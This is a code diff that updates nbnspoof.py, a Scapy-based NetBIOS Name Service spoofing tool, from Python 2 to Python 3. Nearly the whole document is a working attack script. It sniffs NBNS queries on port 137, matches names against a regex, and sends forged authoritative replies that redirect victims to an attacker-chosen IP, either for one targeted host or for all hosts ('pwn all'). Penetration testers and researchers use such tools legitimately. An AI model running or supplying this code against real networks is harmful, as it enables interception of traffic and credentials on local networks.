@@ -1,172 +1,116 @@
-#!/usr/bin/env python
-# 
-# nbnspoof.py
-# 03-27-2007
-# Robert Wesley McGrew
-# wesley@mcgrewsecurity.com
-#
-# http://mcgrewsecurity.com
-#
-# Keeping things simple: You may use this code however you see fit, so 
-# long as you give me proper credit.  Email me if you have any
-# questions.
-#
-# Edit by David Lladro (@nomex) to add support for targeted spoofing
-#
-
+#!/usr/bin/env python3
+# Fixed and updated for Python 3 / Scapy 2.5+
 
 import sys
 import getopt
 import re
 from scapy.all import *
 
-global verbose
-global regexp
-global ip
-global interface
-global mac_addr
-global victim
+# Global configuration
+config = {
+    "verbose": False,
+    "regexp": None,
+    "ip": None,
+    "interface": None,
+    "mac_addr": None,
+    "victim": None
+}
 
 def usage():
-   print """Usage:
-nbnspoof.py [-v] -i <interface> -n <regexp> -h <ip address> -m <MAC>
+    print("""Usage:
+nbnspoof.py [-v] -i <interface> -n <regexp> -h <ip address> -m <MAC> [-p <victim_ip>]
 
 -v Verbose output of sniffed NBNS name queries, and responses sent
-
 -i The interface you want to sniff and send on
-
--n A regular expression applied to each query to determine whether a
-   spoofed response will be sent
-   
+-n A regular expression applied to query names
 -h The IP address that will be sent in spoofed responses
-
--p (optional) The IP address of the victim (if unset, pwn all)
-
+-p (optional) Targeted victim IP address (if unset, pwn all)
 -m The source MAC address for spoofed responses
-"""
-   return
+""")
 
 def pack_ip(addr):
-   temp = IP(src=addr)
-   return str(temp)[0x0c:0x10]
-
-def unpack_ip(bin):
-   temp = IP()
-   temp = str(temp)[:0x0c] + bin + str(temp)[0x10:]
-   temp = IP(temp)
-   return temp.src
+    """Converts an IP string to 4 bytes."""
+    return socket.inet_aton(addr)
 
 def get_packet(pkt):
-   global verbose
-   global regexp
-   global ip
-   global interface
-   global mac_addr
-   global victim
-
-   if not pkt.getlayer(NBNSQueryRequest):
-      return
-
-   if pkt.FLAGS & 0x8000:
-      query = False
-      addr = unpack_ip(str(pkt.getlayer(Raw))[8:])
-   else:
-      query = True
-
-   if victim and query:
-      if pkt.getlayer(IP).src != victim:
-        print "La ip "+ pkt.getlayer(IP).src+" no es igual a "  + victim
+    if not pkt.haslayer(NBNSQueryRequest):
         return
-      else:
-        print "Si que coinciden, hay que PWNEAR"
 
-   if verbose:
-      print str(pkt.NAME_TRN_ID) + ":",
-      if query:
-         print "Q",
-      else:
-         print "R",
-      print "SRC:" + pkt.getlayer(IP).src + " DST:" + pkt.getlayer(IP).dst,
-      if query:
-         print 'NAME:"' + pkt.QUESTION_NAME + '"'
-      else:
-         print 'NAME:"' + pkt.QUESTION_NAME + '"',
-         print 'IP:' + addr
+    # Check if it's a query (Flags & 0x8000 == 0)
+    is_query = not (pkt.getlayer(NBNSQueryRequest).FLAGS & 0x8000)
 
-   if query and regexp.match(pkt.QUESTION_NAME.rstrip(),1):
-      response  = Ether(dst=pkt.src,src=mac_addr)
-      response /= IP(dst=pkt.getlayer(IP).src,src=ip)
-      response /= UDP(sport=137,dport=137)
-      response /= NBNSQueryRequest(NAME_TRN_ID=pkt.getlayer(NBNSQueryRequest).NAME_TRN_ID,\
-                                  FLAGS=0x8500,\
-                                  QDCOUNT=0,\
-                                  ANCOUNT=1,\
-                                  NSCOUNT=0,\
-                                  ARCOUNT=0,\
-                                  QUESTION_NAME=pkt.getlayer(NBNSQueryRequest).QUESTION_NAME,\
-                                  SUFFIX=pkt.getlayer(NBNSQueryRequest).SUFFIX,\
-                                  NULL=0,\
-                                  QUESTION_TYPE=pkt.getlayer(NBNSQueryRequest).QUESTION_TYPE,\
-                                  QUESTION_CLASS=pkt.getlayer(NBNSQueryRequest).QUESTION_CLASS)
-      response /= Raw()
-      # Time to live: 3 days, 11 hours, 20 minutes
-      response.getlayer(Raw).load += '\x00\x04\x93\xe0' 
-      # Data length: 6
-      response.getlayer(Raw).load += '\x00\x06'
-      # Flags: (B-node, unique)
-      response.getlayer(Raw).load += '\x00\x00'
-      # The IP we're giving them:
-      response.getlayer(Raw).load += pack_ip(ip)
-      sendp(response,iface=interface,verbose=0)
-      if verbose:
-         print 'Sent spoofed reply to #' + str(response.getlayer(NBNSQueryRequest).NAME_TRN_ID)
+    # Targeted spoofing check
+    if config["victim"] and is_query:
+        if pkt.getlayer(IP).src != config["victim"]:
+            return
+        elif config["verbose"]:
+            print(f"[*] Target match: {pkt.getlayer(IP).src}")
 
-   return
+    # Process Query
+    if is_query:
+        # Get the name and decode from bytes to string for regex matching
+        q_name = pkt.getlayer(NBNSQueryRequest).QUESTION_NAME.decode('utf-8', 'ignore').strip()
+        
+        if config["verbose"]:
+            print(f"[{pkt.NAME_TRN_ID}] Q SRC:{pkt.getlayer(IP).src} NAME: {q_name}")
+
+        if config["regexp"].search(q_name):
+            # Construct Response
+            # NBNS responses often need a Raw layer for the specific Resource Record data
+            response  = Ether(dst=pkt[Ether].src, src=config["mac_addr"])
+            response /= IP(dst=pkt[IP].src, src=config["ip"])
+            response /= UDP(sport=137, dport=pkt[UDP].sport)
+            
+            # Use NBNSQueryRequest as a base but set response flags
+            nbns_part = NBNSQueryRequest(
+                NAME_TRN_ID=pkt.NAME_TRN_ID,
+                FLAGS=0x8500, # Response, Authoritative, Recursion Desired
+                QDCOUNT=0,
+                ANCOUNT=1,
+                NSCOUNT=0,
+                ARCOUNT=0,
+                QUESTION_NAME=pkt.QUESTION_NAME,
+                SUFFIX=pkt.SUFFIX,
+                QUESTION_TYPE=pkt.QUESTION_TYPE,
+                QUESTION_CLASS=pkt.QUESTION_CLASS
+            )
+            
+            # Construct the Answer section manually via Raw
+            # TTL: 3 days (0x000493e0), Data Len: 6, Flags: 0000, IP: xxxx
+            answer_data = b'\x00\x04\x93\xe0' + b'\x00\x06' + b'\x00\x00' + pack_ip(config["ip"])
+            
+            full_pkt = response / nbns_part / Raw(load=answer_data)
+            
+            sendp(full_pkt, iface=config["interface"], verbose=0)
+            
+            if config["verbose"]:
+                print(f" [+] Sent spoofed reply for {q_name} to {pkt[IP].src}")
 
 def main():
-   global verbose
-   global regexp
-   global ip
-   global interface
-   global mac_addr
-   global victim
+    try:
+        opts, args = getopt.getopt(sys.argv[1:], "vi:n:h:m:p:")
+    except getopt.GetoptError:
+        usage()
+        sys.exit(1)
 
-   try:
-      opts, args = getopt.getopt(sys.argv[1:],"vi:n:h:m:p:")
-   except:
-      usage()
-      sys.exit(1)
+    name_regexp = None
+    
+    for o, a in opts:
+        if o == '-v': config["verbose"] = True
+        elif o == '-i': config["interface"] = a
+        elif o == '-n': name_regexp = a
+        elif o == '-h': config["ip"] = a
+        elif o == '-p': config["victim"] = a
+        elif o == '-m': config["mac_addr"] = a
 
-   verbose = False
-   interface = None
-   name_regexp = None
-   ip = None
-   mac_addr = None
-   victim = None
-   
-   for o, a in opts:
-      if o == '-v':
-         verbose = True
-      if o == '-i':
-         interface = a
-      if o == '-n':
-         name_regexp = a
-      if o == '-h':
-         ip = a
-      if o == '-p':
-         victim = a
-      if o == '-m':
-         mac_addr = a
+    if not config["ip"] or not name_regexp or not config["interface"] or not config["mac_addr"]:
+        usage()
+        sys.exit(1)
 
-   if args or not ip  or not name_regexp or not interface or not mac_addr:
-      usage()
-      sys.exit(1)
+    config["regexp"] = re.compile(name_regexp, re.IGNORECASE)
 
-   regexp = re.compile(name_regexp,re.IGNORECASE)
-
-   sniff(iface=interface,filter="udp and port 137",store=0,prn=get_packet)
-
-   return
+    print(f"[*] Sniffing on {config['interface']}...")
+    sniff(iface=config["interface"], filter="udp and port 137", store=0, prn=get_packet)
 
 if __name__ == "__main__":
-   main()
+    main()
